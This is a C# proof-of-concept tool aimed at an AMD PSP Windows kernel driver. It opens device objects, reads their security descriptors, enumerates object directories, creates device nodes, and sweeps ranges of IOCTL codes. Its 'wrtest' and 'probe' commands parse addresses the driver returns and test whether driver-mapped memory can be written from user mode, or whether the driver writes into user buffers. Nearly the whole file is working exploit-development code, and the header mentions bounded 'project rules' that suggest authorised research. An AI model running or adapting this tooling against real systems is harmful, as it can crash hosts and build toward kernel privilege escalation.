// t8 amdpsp PoC — NT-device open/dacl/ioctl + allocation-ladder wrtest + bounded sweeps
// subcommands (argv[1]=outfile first):
//   open <path> [accHex] [shareHex]      path starting with '\' = NT path (sync NtCreateFile)
//   dacl <path>                          NT or Win path
//   ioctl <path> <codeHex> <inlenHex> <outlenHex> [inhex]
//   qobj <ntdir> <filterRegex>
//   wrtest <path> <codeHex> <inhex> [outlenHex]
//        = allocation IOCTL -> parse out struct -> VirtualQuery candidates -> write 4B -> read back
//   sweepA <path> <codeStartHex> <codeEndHex> <inlenHex> <outlenHex>   contiguous code band
//   sweepB <path>                                        method/access variants of documented codes
//   sweepC <path> <codeStartHex> <codeEndHex> <variant 0|1|2>          0x28-byte header band
// Bounds (project rules): in <= 64 B (shaped headers 0x28 excepted), out <= 0x1000.
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

class T8 {
  [StructLayout(LayoutKind.Sequential)]
  struct IO_STATUS_BLOCK { public IntPtr Status; public IntPtr Information; }

  [StructLayout(LayoutKind.Sequential)]
  struct UNICODE_STRING { public ushort Len; public ushort MaxLen; public IntPtr Buffer; }

  [StructLayout(LayoutKind.Sequential)]
  struct OBJECT_ATTRIBUTES {
    public uint Length; public uint pad;
    public IntPtr RootDirectory; public IntPtr ObjectName;
    public uint Attributes; public uint pad2; public IntPtr SD; public IntPtr SQOS;
  }

  [StructLayout(LayoutKind.Sequential)]
  struct MEMORY_BASIC_INFORMATION {
    public IntPtr BaseAddress; public IntPtr AllocationBase; public uint AllocationProtect;
    public IntPtr RegionSize; public uint State; public uint Protect; public uint Type;
  }

  [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
  static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr sa, uint disp, uint flags, IntPtr tmpl);
  [DllImport("kernel32.dll", SetLastError = true)]
  static extern bool CloseHandle(IntPtr h);
  [DllImport("kernel32.dll", SetLastError = true)]
  static extern IntPtr VirtualQuery(IntPtr addr, ref MEMORY_BASIC_INFORMATION mbi, uint len);
  [DllImport("advapi32.dll", SetLastError = true)]
  static extern bool GetKernelObjectSecurity(IntPtr h, uint sdInfo, IntPtr sd, uint sdLen, out uint need);
  [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
  static extern int ConvertSecurityDescriptorToStringSecurityDescriptorW(IntPtr sd, uint rev, uint info, out IntPtr str, out uint strLen);

  [DllImport("ntdll.dll")]
  static extern int NtDeviceIoControlFile(IntPtr h, IntPtr ev, IntPtr apcRoutine, IntPtr apcCtx, ref IO_STATUS_BLOCK iosb, uint code, IntPtr inBuf, uint inLen, IntPtr outBuf, uint outLen);
  [DllImport("ntdll.dll")]
  static extern int NtCreateFile(out IntPtr h, uint access, ref OBJECT_ATTRIBUTES attr, ref IO_STATUS_BLOCK iosb, IntPtr alloc, uint fattr, uint share, uint disp, uint opts, IntPtr ea, uint ealen);
  [DllImport("ntdll.dll")]
  static extern int NtOpenDirectoryObject(out IntPtr h, uint access, ref OBJECT_ATTRIBUTES attr);
  [DllImport("ntdll.dll")]
  static extern int NtQueryDirectoryObject(IntPtr h, IntPtr buf, uint len, bool single, bool restart, ref uint ctx, out uint ret);

  [DllImport("cfgmgr32.dll", CharSet = CharSet.Unicode)]
  static extern int CM_Locate_DevNodeW(out uint devinst, string deviceId, uint flags);
  [DllImport("cfgmgr32.dll", CharSet = CharSet.Unicode)]
  static extern int CM_Create_DevNodeW(out uint devinst, string deviceId, uint parent, uint flags);
  [DllImport("cfgmgr32.dll")]
  static extern int CM_Get_DevNode_Status(out uint status, out uint problem, uint devinst, uint flags);

  static string OUT;
  static object lck = new object();
  static void Log(string s) { lock (lck) { File.AppendAllText(OUT, s + "\r\n"); } }  // per-line immediate flush

  static bool IsBadH(IntPtr h) { return h == new IntPtr(-1) || h == new IntPtr(-2); }

  static IntPtr OpenDevWin(string path, uint acc, uint share) {
    return CreateFileW(path, acc, share, IntPtr.Zero, 3, 0, IntPtr.Zero); // OPEN_EXISTING
  }

  static int OpenDevNt(string path, uint acc, out IntPtr h) {
    OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
    oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
    oa.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
    UNICODE_STRING us = new UNICODE_STRING();
    us.Len = (ushort)(path.Length * 2); us.MaxLen = (ushort)((path.Length + 1) * 2);
    us.Buffer = Marshal.StringToHGlobalUni(path);
    IntPtr pUS = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
    Marshal.StructureToPtr(us, pUS, false);
    oa.ObjectName = pUS;
    acc |= 0x00100000; // SYNCHRONIZE
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    // FILE_OPEN(1), FILE_SYNCHRONOUS_IO_NONALERT(0x20), share R/W/D(3)
    return NtCreateFile(out h, acc, ref oa, ref iosb, IntPtr.Zero, 0, 3, 1, 0x20, IntPtr.Zero, 0);
  }

  // returns IntPtr.Zero on failure (logged); opens Win (\\.\name) or NT (\Device\name) path
  static IntPtr OpenAny(string path, uint acc) {
    IntPtr h;
    if (path.StartsWith("\\\\")) { // Win32 path (\\.\name)
      h = OpenDevWin(path, acc, 3);
      if (IsBadH(h)) {
        Log(string.Format("open {0} acc=0x{1:X} -> FAIL err={2}", path, acc, Marshal.GetLastWin32Error()));
        return IntPtr.Zero;
      }
      Log(string.Format("open {0} acc=0x{1:X} -> OK h=0x{2:X}", path, acc, h.ToInt64()));
      return h;
    }
    if (path.StartsWith("\\")) { // NT path (\Device\name)
      int st = OpenDevNt(path, acc, out h);
      Log(string.Format("open {0} (nt) acc=0x{1:X} -> st=0x{2:X8}", path, acc, st));
      if (st != 0) return IntPtr.Zero;
      return h;
    }
    h = OpenDevWin(path, acc, 3);
    if (IsBadH(h)) {
      Log(string.Format("open {0} acc=0x{1:X} -> FAIL err={2}", path, acc, Marshal.GetLastWin32Error()));
      return IntPtr.Zero;
    }
    Log(string.Format("open {0} acc=0x{1:X} -> OK h=0x{2:X}", path, acc, h.ToInt64()));
    return h;
  }

  static string HexOf(IntPtr buf, uint n) {
    if (n > 0x80) n = 0x80;
    StringBuilder sb = new StringBuilder();
    for (uint i = 0; i < n; i++) sb.Append(Marshal.ReadByte(buf, (int)i).ToString("x2"));
    bool sentinel = true;
    for (uint i = 0; i < n; i++) if (Marshal.ReadByte(buf, (int)i) != 0xEE) { sentinel = false; break; }
    return sb.ToString() + (n > 0 && sentinel ? " [all-sentinel]" : " [DATA]");
  }

  // ---------- DACL ----------
  static void DaclOf(IntPtr h, string label) {
    IntPtr sd = Marshal.AllocHGlobal(8192); uint need;
    if (!GetKernelObjectSecurity(h, 0x7, sd, 8192, out need)) {
      Log("dacl " + label + " GetKernelObjectSecurity err=" + Marshal.GetLastWin32Error());
    } else {
      IntPtr sddl; uint sddlLen;
      int rc = ConvertSecurityDescriptorToStringSecurityDescriptorW(sd, 1, 0x7, out sddl, out sddlLen);
      if (rc != 0) Log("dacl " + label + " SDDL=" + Marshal.PtrToStringUni(sddl));
      else Log("dacl " + label + " convert err=" + Marshal.GetLastWin32Error());
    }
    CloseHandle(h);
  }

  static void CmdDacl(string path) {
    IntPtr h = OpenAny(path, 0x00020000); // READ_CONTROL
    if (h == IntPtr.Zero) return;
    DaclOf(h, path);
  }

  // ---------- qobj ----------
  static void CmdQobj(string dir, string filter) {
    IntPtr h;
    OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
    oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
    oa.Attributes = 0x40;
    UNICODE_STRING us = new UNICODE_STRING();
    us.Len = (ushort)(dir.Length * 2); us.MaxLen = (ushort)((dir.Length + 1) * 2);
    us.Buffer = Marshal.StringToHGlobalUni(dir);
    IntPtr pUS = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
    Marshal.StructureToPtr(us, pUS, false);
    oa.ObjectName = pUS;
    int st = NtOpenDirectoryObject(out h, 0x1 | 0x8, ref oa); // QUERY|TRAVERSE
    if (st != 0) { Log("qobj " + dir + " open st=0x" + st.ToString("X8")); return; }
    IntPtr buf = Marshal.AllocHGlobal(65536);
    uint ctx = 0, ret; bool first = true; Regex rx = new Regex(filter, RegexOptions.IgnoreCase);
    while (true) {
      st = NtQueryDirectoryObject(h, buf, 65536, true, first, ref ctx, out ret); // ReturnSingleEntry=TRUE
      first = false;
      if (st != 0 || ret == 0) break;
      for (uint i = 0; i < ret; i++) {
        string n, t; USAt(buf, (int)(i * 32), out n); USAt(buf, (int)(i * 32 + 16), out t);
        if (rx.IsMatch(n)) Log(string.Format("{0} -> {1} [{2}]", dir, n, t));
      }
    }
    Log("qobj " + dir + " scan complete (st=0x" + st.ToString("X8") + ")");
  }

  static void USAt(IntPtr baseP, int off, out string s) {
    ushort len = (ushort)Marshal.ReadInt16(baseP, off);
    IntPtr b = Marshal.ReadIntPtr(baseP, off + 8);
    s = (len == 0 || b == IntPtr.Zero) ? "" : Marshal.PtrToStringUni(b, len / 2);
  }

  // ---------- ioctl ----------
  static void CmdIoctl(string path, uint code, uint inLen, uint outLen, byte[] inBytes) {
    IntPtr h = OpenAny(path, 0x12019F);
    if (h == IntPtr.Zero) return;
    IntPtr inBuf = inLen > 0 ? Marshal.AllocHGlobal((int)inLen) : IntPtr.Zero;
    IntPtr outBuf = outLen > 0 ? Marshal.AllocHGlobal((int)outLen) : IntPtr.Zero;
    for (uint i = 0; i < inLen; i++) Marshal.WriteByte(inBuf, (int)i, (i < inBytes.Length) ? inBytes[i] : (byte)0);
    for (uint i = 0; i < outLen; i++) Marshal.WriteByte(outBuf, (int)i, 0xEE);
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    int st = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, code, inBuf, inLen, outBuf, outLen);
    uint info = (uint)iosb.Information.ToInt64();
    Log(string.Format("ioctl {0} code=0x{1:X8} in=0x{2:X} out=0x{3:X} -> st=0x{4:X8} ret={5}", path, code, inLen, outLen, st, info));
    if (info > 0 && outLen > 0) Log("   out[0.." + Math.Min(info, 0x80) + "] = " + HexOf(outBuf, Math.Min(info, (uint)0x80)));
    if (inBuf != IntPtr.Zero) Marshal.FreeHGlobal(inBuf);
    if (outBuf != IntPtr.Zero) Marshal.FreeHGlobal(outBuf);
    CloseHandle(h);
  }

  // ---------- wrtest: alloc ioctl -> parse VA candidates -> write/readback ----------
  static readonly byte[] WRPAT = { 0x5A, 0xC7, 0x5E, 0x1A };

  static void CmdWrTest(string path, uint code, byte[] inBytes, uint outLen, bool shape820, bool freeAfter) {
    IntPtr h = OpenAny(path, 0x12019F);
    if (h == IntPtr.Zero) return;
    uint inLen;
    IntPtr inBuf;
    if (shape820) {
      inLen = 0x168;
      inBuf = Marshal.AllocHGlobal(0x168);
      for (uint i = 0; i < inLen; i++) Marshal.WriteByte(inBuf, (int)i, 0);
      Marshal.WriteInt32(inBuf, 0x158, 0x1000);
      Log("wrtest shape820: 0x168 struct built (dword@0x158=0x1000), out=0x158");
    } else {
      inLen = (uint)inBytes.Length;
      inBuf = inLen > 0 ? Marshal.AllocHGlobal((int)inLen) : IntPtr.Zero;
      for (uint i = 0; i < inLen; i++) Marshal.WriteByte(inBuf, (int)i, (i < inBytes.Length) ? inBytes[i] : (byte)0);
    }
    IntPtr outBuf = outLen > 0 ? Marshal.AllocHGlobal((int)outLen) : IntPtr.Zero;
    for (uint i = 0; i < outLen; i++) Marshal.WriteByte(outBuf, (int)i, 0xEE);
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    int st = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, code, inBuf, inLen, outBuf, outLen);
    uint info = (uint)iosb.Information.ToInt64();
    Log(string.Format("wrtest {0} code=0x{1:X8} in=0x{2:X} out=0x{3:X} -> st=0x{4:X8} ret={5}", path, code, inLen, outLen, st, info));
    if (info > 0 && outLen > 0) Log("   out[0.." + Math.Min(info, (uint)0x80) + "] = " + HexOf(outBuf, Math.Min(info, (uint)0x80)));
    if (inLen > 0) Log("   in-copied-back[0.." + Math.Min(inLen, (uint)0x168) + "] = " + HexOf(inBuf, Math.Min(inLen, (uint)0x168)));
    long firstCand = 0;
    if (st == 0 && info >= 8) {
      // dump qwords at 4-aligned offsets
      for (uint off = 0; off + 8 <= info && off < 0x80; off += 4) {
        long v = Marshal.ReadInt64(outBuf, (int)off);
        Log(string.Format("   qword@0x{0:X2} = 0x{1:X16}", off, v));
      }
      // user-VA candidates
      int cand = 0;
      for (uint off = 0; off + 8 <= info && off < 0x80 && cand < 8; off += 4) {
        long v = Marshal.ReadInt64(outBuf, (int)off);
        if (v > 0x10000L && v < 0x0000800000000000L) {
          cand++;
          if (firstCand == 0) firstCand = v;
          Log(string.Format("   VA-CANDIDATE#{0} offset=0x{1:X2} va=0x{2:X12}", cand, off, v));
          ProbeCandidate((IntPtr)v, cand, off);
        }
      }
      if (cand == 0) Log("   no user-VA candidates found in output (criterion v>0x10000 && v<0x800000000000)");
    }
    if (freeAfter && firstCand != 0) {
      Log(string.Format("   free 0x9c422003 with VA=0x{0:X12} ...", firstCand));
      IntPtr fin = Marshal.AllocHGlobal(8);
      Marshal.WriteInt64(fin, firstCand);
      IntPtr fout = Marshal.AllocHGlobal(0x38);
      for (uint i = 0; i < 0x38; i++) Marshal.WriteByte(fout, (int)i, 0xEE);
      IO_STATUS_BLOCK fiosb = new IO_STATUS_BLOCK();
      int fst = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref fiosb, 0x9c422003, fin, 8, fout, 0x38);
      uint finfo = (uint)fiosb.Information.ToInt64();
      Log(string.Format("   free -> st=0x{0:X8} ret={1} err@out0=0x{2:X8}", fst, finfo, fst == 0 ? Marshal.ReadInt32(fout, 0) : 0));
      Marshal.FreeHGlobal(fin); Marshal.FreeHGlobal(fout);
    }
    if (inBuf != IntPtr.Zero) Marshal.FreeHGlobal(inBuf);
    if (outBuf != IntPtr.Zero) Marshal.FreeHGlobal(outBuf);
    CloseHandle(h);
  }

  static void ProbeCandidate(IntPtr va, int idx, uint off) {
    MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
    IntPtr got = VirtualQuery(va, ref mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
    if (got == IntPtr.Zero) { Log(string.Format("     cand#{0} VirtualQuery err={1}", idx, Marshal.GetLastWin32Error())); return; }
    Log(string.Format("     cand#{0} state=0x{1:X} protect=0x{2:X} type=0x{3:X} base=0x{4:X} region=0x{5:X}",
      idx, mbi.State, mbi.Protect, mbi.Type, mbi.BaseAddress.ToInt64(), mbi.RegionSize.ToInt64()));
    const uint MEM_COMMIT = 0x1000;
    bool writable = (mbi.State == MEM_COMMIT) && ((mbi.Protect & 0xFF) == 0x04 || (mbi.Protect & 0xFF) == 0x40 || (mbi.Protect & 0xFF) == 0x08) && (mbi.Protect & 0x100) == 0;
    if (!writable) { Log("     cand#" + idx + " not writable -> skip write"); return; }
    try {
      int orig = Marshal.ReadInt32(va);
      Marshal.WriteInt32(va, (int)((uint)(WRPAT[0] | (WRPAT[1] << 8) | (WRPAT[2] << 16) | (WRPAT[3] << 24))));
      int back = Marshal.ReadInt32(va);
      Marshal.WriteInt32(va, orig); // restore original 4 bytes
      bool match = back == (int)0x1A5EC75A;
      Log(string.Format("     cand#{0} WRITE-TEST va=0x{1:X12} orig=0x{2:X8} readback=0x{3:X8} match={4}  <<< USER-MAP WRITABLE={5}",
        idx, va.ToInt64(), orig, back, match, match));
    } catch (Exception e) {
      Log("     cand#" + idx + " write/readback EXC: " + e.GetType().Name + " " + e.Message);
    }
  }

  // ---------- sweeps ----------
  static IntPtr OpenSweep(string path) {
    IntPtr h = OpenAny(path, 0x12019F);
    return h;
  }

  static string SweepOnce(IntPtr h, uint code, uint inLen, IntPtr inBuf, uint outLen, IntPtr outBuf) {
    for (uint i = 0; i < outLen && outLen > 0; i++) Marshal.WriteByte(outBuf, (int)i, 0xEE);
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    int st = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, code, inLen > 0 ? inBuf : IntPtr.Zero, inLen, outLen > 0 ? outBuf : IntPtr.Zero, outLen);
    uint info = (uint)iosb.Information.ToInt64();
    StringBuilder sb = new StringBuilder();
    sb.AppendFormat("code=0x{0:X8} st=0x{1:X8} ret={2}", code, st, info);
    if (info > 0 && outLen > 0) sb.Append(" out=" + HexOf(outBuf, Math.Min(info, (uint)0x40)));
    return sb.ToString();
  }

  static void CmdSweepA(string path, uint c0, uint c1, uint inLen, uint outLen) {
    IntPtr h = OpenSweep(path);
    if (h == IntPtr.Zero) return;
    IntPtr inBuf = inLen > 0 ? Marshal.AllocHGlobal((int)inLen) : IntPtr.Zero;
    if (inLen > 0) for (uint i = 0; i < inLen; i++) Marshal.WriteByte(inBuf, (int)i, 0);
    IntPtr outBuf = outLen > 0 ? Marshal.AllocHGlobal((int)outLen) : IntPtr.Zero;
    for (uint c = c0; c <= c1; c++) Log("sweepA " + SweepOnce(h, c, inLen, inBuf, outLen, outBuf));
    Log(string.Format("sweepA {0} codes 0x{1:X8}..0x{2:X8} COMPLETE (in=0x{3:X} out=0x{4:X})", path, c0, c1, inLen, outLen));
    if (inBuf != IntPtr.Zero) Marshal.FreeHGlobal(inBuf);
    if (outBuf != IntPtr.Zero) Marshal.FreeHGlobal(outBuf);
    CloseHandle(h);
  }

  static void CmdSweepB(string path) {
    IntPtr h = OpenSweep(path);
    if (h == IntPtr.Zero) return;
    uint inLen = 8, outLen = 0x38;
    IntPtr inBuf = Marshal.AllocHGlobal((int)inLen);
    for (uint i = 0; i < inLen; i++) Marshal.WriteByte(inBuf, (int)i, 0);
    IntPtr outBuf = Marshal.AllocHGlobal((int)outLen);
    uint[] bases = { 0x9c422000, 0x9c422002, 0x9c422003, 0x9c422004, 0x9c422005, 0x9c422009 };
    foreach (uint c in bases) {
      for (uint m = 0; m < 4; m++) { // method bits
        uint v = (c & 0xFFFFFFFCu) | m;
        Log("sweepB " + SweepOnce(h, v, inLen, inBuf, outLen, outBuf));
      }
      for (uint a = 0; a < 4; a++) { // access bits
        uint v = (c & 0xFFFF3FFFu) | (a << 14);
        Log("sweepB " + SweepOnce(h, v, inLen, inBuf, outLen, outBuf));
      }
    }
    Log("sweepB variants COMPLETE");
    Marshal.FreeHGlobal(inBuf); Marshal.FreeHGlobal(outBuf);
    CloseHandle(h);
  }

  static void CmdSweepC(string path, uint c0, uint c1, uint variant) {
    IntPtr h = OpenSweep(path);
    if (h == IntPtr.Zero) return;
    uint inLen = 0x28, outLen = 0x1000;
    IntPtr inBuf = Marshal.AllocHGlobal((int)inLen);
    IntPtr outBuf = Marshal.AllocHGlobal((int)outLen);
    for (uint i = 0; i < inLen; i++) Marshal.WriteByte(inBuf, (int)i, 0);
    if (variant == 1) { // small-size fields
      Marshal.WriteInt32(inBuf, 0x00, 0x28);
      Marshal.WriteInt32(inBuf, 0x04, 0x100);
      Marshal.WriteInt32(inBuf, 0x10, 0x1000);
      Marshal.WriteInt32(inBuf, 0x14, 0x100);
    } else if (variant == 2) { // PSP-tag + plausible sizes
      Marshal.WriteInt32(inBuf, 0x00, 0x00505350); // "PSP\0"
      Marshal.WriteInt32(inBuf, 0x10, 0x28);
      Marshal.WriteInt32(inBuf, 0x14, 0x1000);
    }
    Log(string.Format("sweepC variant={0} header={1}", variant, HexOf(inBuf, inLen)));
    for (uint c = c0; c <= c1; c++) Log("sweepC " + SweepOnce(h, c, inLen, inBuf, outLen, outBuf));
    Log(string.Format("sweepC {0} codes 0x{1:X8}..0x{2:X8} variant={3} COMPLETE", path, c0, c1, variant));
    Marshal.FreeHGlobal(inBuf); Marshal.FreeHGlobal(outBuf);
    CloseHandle(h);
  }

  // ---------- probe: shaped (ptr,len) probe-capture family ----------
  static void CmdProbe(string path, uint code, uint structLen, uint lenOff, uint ptrOff, uint outLen) {
    IntPtr h = OpenAny(path, 0x12019F);
    if (h == IntPtr.Zero) return;
    IntPtr sink = Marshal.AllocHGlobal(0x100);            // committed user page (probed target)
    for (int i = 0; i < 0x100; i++) Marshal.WriteByte(sink, i, 0xEE);
    IntPtr inBuf = structLen > 0 ? Marshal.AllocHGlobal((int)structLen) : IntPtr.Zero;
    for (uint i = 0; i < structLen; i++) Marshal.WriteByte(inBuf, (int)i, 0);
    if (lenOff + 4 <= structLen) Marshal.WriteInt32(inBuf, (int)lenOff, 0x40);
    if (ptrOff + 8 <= structLen) Marshal.WriteInt64(inBuf, (int)ptrOff, sink.ToInt64());
    IntPtr outBuf = outLen > 0 ? Marshal.AllocHGlobal((int)outLen) : IntPtr.Zero;
    for (uint i = 0; i < outLen; i++) Marshal.WriteByte(outBuf, (int)i, 0xEE);
    IO_STATUS_BLOCK iosb = new IO_STATUS_BLOCK();
    int st = NtDeviceIoControlFile(h, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref iosb, code, inBuf, structLen, outBuf, outLen);
    uint info = (uint)iosb.Information.ToInt64();
    Log(string.Format("probe {0} code=0x{1:X8} len=0x{2:X} lenOff=0x{3:X} ptrOff=0x{4:X} -> st=0x{5:X8} ret={6}",
      path, code, structLen, lenOff, ptrOff, st, info));
    if (structLen > 0) Log("   struct-after[0.." + Math.Min(structLen, (uint)0x80) + "] = " + HexOf(inBuf, Math.Min(structLen, (uint)0x80)));
    if (outLen > 0 && info > 0) Log("   out[0.." + Math.Min(info, (uint)0x80) + "] = " + HexOf(outBuf, Math.Min(info, (uint)0x80)));
    StringBuilder sb2 = new StringBuilder();
    for (int i = 0; i < 0x40; i++) sb2.Append(Marshal.ReadByte(sink, i).ToString("x2"));
    bool touched = false; for (int i = 0; i < 0x100; i++) if (Marshal.ReadByte(sink, i) != 0xEE) { touched = true; break; }
    Log("   sink(user buf) = " + sb2 + (touched ? "  <-- DRIVER WROTE TO USER BUF" : " (untouched)"));
    Marshal.FreeHGlobal(sink);
    if (inBuf != IntPtr.Zero) Marshal.FreeHGlobal(inBuf);
    if (outBuf != IntPtr.Zero) Marshal.FreeHGlobal(outBuf);
    CloseHandle(h);
  }

  static void CmdMkDev(string devid, string parent) {
    uint pdn, cdn;
    int cr = CM_Locate_DevNodeW(out pdn, parent, 0);
    if (cr != 0) { Log("mkdev " + devid + " parent-locate " + parent + " CR=0x" + cr.ToString("X")); return; }
    cr = CM_Create_DevNodeW(out cdn, devid, pdn, 0);
    if (cr == 0) {
      uint st, pr;
      int cr2 = CM_Get_DevNode_Status(out st, out pr, cdn, 0);
      Log(string.Format("mkdev {0} parent={1} CR=0 dn=0x{2:X} status=0x{3:X} problem={4} (statCR=0x{5:X})",
        devid, parent, cdn, cr2 == 0 ? st : 0, cr2 == 0 ? pr : 0, cr2));
    } else {
      Log("mkdev " + devid + " parent=" + parent + " CR=0x" + cr.ToString("X"));
    }
  }

  static void CmdDevStat(string devid) {
    uint dn, st, pr;
    int cr = CM_Locate_DevNodeW(out dn, devid, 0);
    if (cr != 0) { Log("devstat " + devid + " locate CR=0x" + cr.ToString("X")); return; }
    cr = CM_Get_DevNode_Status(out st, out pr, dn, 0);
    Log(string.Format("devstat {0} dn=0x{1:X} CR=0x{2:X} status=0x{3:X} problem={4}", devid, dn, cr, st, pr));
  }

  // ---------- main ----------
  static byte[] HexToBytes(string h) {
    if (h.Length % 2 != 0) h = "0" + h;
    byte[] b = new byte[h.Length / 2];
    for (int i = 0; i < b.Length; i++) b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
    return b;
  }

  static uint ArgHex(string[] a, int idx, uint def) {
    if (a.Length <= idx) return def;
    try { return Convert.ToUInt32(a[idx], 16); } catch { return def; }
  }

  static void Main(string[] args) {
    OUT = args[0];
    Log("t8_poc start " + DateTime.Now.ToString("o"));
    try {
      string cmd = args.Length > 1 ? args[1] : "";
      if (cmd == "open") {
        uint acc = ArgHex(args, 3, 0x12019F);
        uint sh = ArgHex(args, 4, 3);
        if (args[2].StartsWith("\\\\")) {
          IntPtr h = OpenDevWin(args[2], acc, sh); Log("open " + args[2] + " acc=0x" + acc.ToString("X") + " share=0x" + sh.ToString("X") + " -> " + (IsBadH(h) ? "FAIL err=" + Marshal.GetLastWin32Error() : "OK h=0x" + h.ToInt64().ToString("X"))); if (!IsBadH(h)) CloseHandle(h);
        } else if (args[2].StartsWith("\\")) { IntPtr dh; int st = OpenDevNt(args[2], acc, out dh); Log("open " + args[2] + " (nt) st=0x" + st.ToString("X8") + (st == 0 ? " OK (closing)" : "")); if (st == 0) CloseHandle(dh); }
        else { IntPtr h = OpenDevWin(args[2], acc, sh); Log("open " + args[2] + " acc=0x" + acc.ToString("X") + " share=0x" + sh.ToString("X") + " -> " + (IsBadH(h) ? "FAIL err=" + Marshal.GetLastWin32Error() : "OK h=0x" + h.ToInt64().ToString("X"))); if (!IsBadH(h)) CloseHandle(h); }
      } else if (cmd == "dacl") { CmdDacl(args[2]); }
      else if (cmd == "qobj") { CmdQobj(args[2], args[3]); }
      else if (cmd == "mkdev") { CmdMkDev(args[2], args[3]); }
      else if (cmd == "devstat") { CmdDevStat(args[2]); }
      else if (cmd == "ioctl") {
        uint code = ArgHex(args, 3, 0);
        uint inLen = ArgHex(args, 4, 0);
        uint outLen = ArgHex(args, 5, 0x38);
        byte[] inb = args.Length > 6 ? HexToBytes(args[6]) : new byte[0];
        CmdIoctl(args[2], code, inLen, outLen, inb);
      } else if (cmd == "wrtest") {
        uint code = ArgHex(args, 3, 0x9c422002);
        string inArg = args.Length > 4 ? args[4] : "";
        bool shape820 = inArg == "shape820";
        byte[] inb = (shape820 || inArg.Length == 0) ? new byte[0] : HexToBytes(inArg);
        uint outLen = ArgHex(args, 5, 0x38);
        bool freeAfter = args.Length > 6 && args[6] == "free";
        CmdWrTest(args[2], code, inb, outLen, shape820, freeAfter);
      } else if (cmd == "probe") {
        uint code = ArgHex(args, 3, 0);
        uint sl = ArgHex(args, 4, 0x18);
        uint lo = ArgHex(args, 5, 0xFE);
        uint po = ArgHex(args, 6, 0xFE);
        uint ol = ArgHex(args, 7, 0x38);
        CmdProbe(args[2], code, sl, lo, po, ol);
      } else if (cmd == "sweepA") {
        uint c0 = ArgHex(args, 3, 0x9c422000);
        uint c1 = ArgHex(args, 4, c0);
        uint inLen = ArgHex(args, 5, 16);
        uint outLen = ArgHex(args, 6, 0x38);
        CmdSweepA(args[2], c0, c1, inLen, outLen);
      } else if (cmd == "sweepB") { CmdSweepB(args[2]); }
      else if (cmd == "sweepC") {
        uint c0 = ArgHex(args, 3, 0x9c422800);
        uint c1 = ArgHex(args, 4, 0x9c42283f);
        uint variant = ArgHex(args, 5, 0);
        CmdSweepC(args[2], c0, c1, variant);
      } else Log("unknown cmd: " + cmd);
    } catch (Exception e) {
      Log("EXCEPTION: " + e.GetType().Name + ": " + e.Message);
    }
    Log("t8_poc end " + DateTime.Now.ToString("o"));
  }
}
